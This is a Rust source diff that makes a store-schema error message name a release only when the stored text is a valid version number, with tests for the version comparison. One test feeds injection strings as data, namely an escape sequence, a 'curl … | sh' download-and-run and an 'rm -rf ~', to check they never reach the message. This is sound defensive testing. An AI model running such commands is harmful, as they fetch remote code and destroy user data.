@@ -649,8 +649,10 @@ enum SavedBy<'a> {
 }
 
 impl<'a> SavedBy<'a> {
+    /// A text that is not a release as the stamp writes one is not known: the
+    /// store holds any text, and a message puts it in a command to run.
     fn of(release: Option<&'a str>) -> Self {
-        match release {
+        match release.filter(|release| crate::store::is_release(release)) {
             Some(crate::store::DEVELOPMENT_RELEASE) => SavedBy::Development,
             Some(release) => SavedBy::Release(release),
             None => SavedBy::Unknown,
@@ -677,9 +679,30 @@ impl<'a> SavedBy<'a> {
     }
 }
 
+/// Whether release `recorded` is earlier than release `this`, both as the
+/// stamp writes them.
+fn is_earlier(recorded: &str, this: &str) -> bool {
+    let numbers = |release: &str| -> Option<Vec<u64>> {
+        release.split('.').map(|part| part.parse().ok()).collect()
+    };
+    matches!((numbers(recorded), numbers(this)), (Some(recorded), Some(this)) if recorded < this)
+}
+
 /// Never advises deleting the store: only the build that made it can send
 /// what it holds.
 fn wrong_schema(
+    path: &str,
+    reason: &str,
+    unsent: Option<u64>,
+    folder: Option<&FolderStore>,
+    release: Option<&str>,
+) -> String {
+    wrong_schema_from(crate::store::RELEASE, path, reason, unsent, folder, release)
+}
+
+/// `wrong_schema` for a build made as release `this`.
+fn wrong_schema_from(
+    this: &str,
     path: &str,
     reason: &str,
     unsent: Option<u64>,
@@ -691,24 +714,27 @@ fn wrong_schema(
         return refused_directory(path, reason, unsent, folder, &saved);
     }
     let writes = |count: u64| if count == 1 { "write" } else { "writes" };
-    let that_build = match &saved {
-        SavedBy::Release(release) => format!(
-            "install release {release} (`MARFA_VERSION={release}` with the install script) and, with it, "
+    let (install, until) = match &saved {
+        SavedBy::Release(release) => (
+            format!(
+                "; install release {release} (`MARFA_VERSION={release}` with the install script) to open it"
+            ),
+            if is_earlier(release, this) {
+                ", and upgrade again only once it holds none"
+            } else {
+                ", and use that release until it holds none"
+            },
         ),
-        _ => String::new(),
-    };
-    let upgrade_after = match &saved {
-        SavedBy::Release(_) => ", and upgrade again only once it holds none",
-        _ => "",
+        _ => (String::new(), ""),
     };
     let holds = match unsent {
         Some(0) => "Every write it holds the server has taken, so a store hydrated in its place loses nothing".to_string(),
         Some(count) => format!(
-            "It holds {count} {} the server has not taken, waiting, blocked, refused or dead, which only the build that made it can send: {that_build}list them (`marfa device unsent`, or `readUnsent` in a binding), and open it with that build to drain or discard them before hydrating a new store{upgrade_after}",
+            "It holds {count} {} the server has not taken, waiting, blocked, refused or dead, which only the build that made it can send: list them (`marfa device unsent`, or `readUnsent` in a binding), and open it with that build to drain or discard them before hydrating a new store{install}{until}",
             writes(count)
         ),
         None => format!(
-            "Whether it holds writes the server has not taken cannot be read: {that_build}open it with the build that made it and drain or discard them before hydrating a new store{upgrade_after}"
+            "Whether it holds writes the server has not taken cannot be read: open it with the build that made it and drain or discard them before hydrating a new store{install}{until}"
         ),
     };
     format!(
@@ -985,16 +1011,30 @@ mod tests {
         for unsent in [Some(2), None] {
             let said = refused_device(unsent, Some("0.0.80"));
             assert!(said.contains("last saved by release 0.0.80"), "{said}");
+            // The original clause stays, and the install text follows it.
+            if unsent.is_some() {
+                assert!(
+                    said.contains("list them (`marfa device unsent`, or `readUnsent` in a binding), and open it with that build to drain or discard them before hydrating a new store"),
+                    "{said}"
+                );
+            } else {
+                assert!(
+                    said.contains("open it with the build that made it and drain or discard them before hydrating a new store"),
+                    "{said}"
+                );
+            }
             assert!(
                 said.contains(
-                    "install release 0.0.80 (`MARFA_VERSION=0.0.80` with the install script)"
+                    "install release 0.0.80 (`MARFA_VERSION=0.0.80` with the install script) to open it"
                 ),
                 "{said}"
             );
+            // A development build is older than no release, so 0.0.80 is later: a downgrade.
             assert!(
-                said.contains("upgrade again only once it holds none"),
+                said.contains("use that release until it holds none"),
                 "{said}"
             );
+            assert!(!said.contains("upgrade again"), "{said}");
         }
         // Nothing waits, so there is nothing to send: the release is named, no install is asked.
         let none = refused_device(Some(0), Some("0.0.80"));
@@ -1008,6 +1048,7 @@ mod tests {
         );
         assert!(!unknown.contains("MARFA_VERSION"), "{unknown}");
         assert!(!unknown.contains("upgrade again"), "{unknown}");
+        assert!(!unknown.contains("until it holds none"), "{unknown}");
         // A build no release stamped is no release to install.
         let development = refused_device(Some(2), Some("0.0.0"));
         assert!(
@@ -1015,6 +1056,71 @@ mod tests {
             "{development}"
         );
         assert!(!development.contains("MARFA_VERSION"), "{development}");
+    }
+
+    #[test]
+    fn a_refused_store_says_to_upgrade_again_only_for_a_release_older_than_this_build() {
+        let said = |this: &str, release: &str, unsent: Option<u64>| {
+            wrong_schema_from(this, "/data/core.sqlite", "r", unsent, None, Some(release))
+        };
+        for unsent in [Some(2), None] {
+            let older = said("0.0.81", "0.0.80", unsent);
+            assert!(
+                older.contains(
+                    "install release 0.0.80 (`MARFA_VERSION=0.0.80` with the install script) to open it, and upgrade again only once it holds none"
+                ),
+                "{older}"
+            );
+            assert!(!older.contains("use that release"), "{older}");
+            // The witness: a later release is a downgrade, and numbers compare as numbers.
+            for newer in [
+                said("0.0.79", "0.0.80", unsent),
+                said("0.0.9", "0.0.10", unsent),
+            ] {
+                assert!(
+                    newer.contains("to open it, and use that release until it holds none"),
+                    "{newer}"
+                );
+                assert!(!newer.contains("upgrade again"), "{newer}");
+            }
+            let tens = said("0.0.10", "0.0.9", unsent);
+            assert!(
+                tens.contains("upgrade again only once it holds none"),
+                "{tens}"
+            );
+        }
+    }
+
+    #[test]
+    fn a_release_that_is_not_three_numbers_is_not_named_in_a_refusal() {
+        for text in [
+            "0.0.80\u{1b}[31m; curl https://example.test/x | sh",
+            "0.0.80 && rm -rf ~",
+            "v0.0.80",
+            "",
+        ] {
+            for folder in [None, Some(FolderStore::Replaceable)] {
+                let said = CoreError::WrongSchema {
+                    path: "/data/core.sqlite".into(),
+                    reason: "r".into(),
+                    unsent: Some(2),
+                    folder,
+                    release: Some(text.into()),
+                }
+                .to_string();
+                assert!(
+                    said.contains("the release that last saved it is not known"),
+                    "{text:?}: {said}"
+                );
+                assert!(
+                    !said.contains("MARFA_VERSION")
+                        && !said.contains('\u{1b}')
+                        && !said.contains("curl")
+                        && !said.contains("rm -rf"),
+                    "{text:?}: {said}"
+                );
+            }
+        }
     }
 
     #[test]
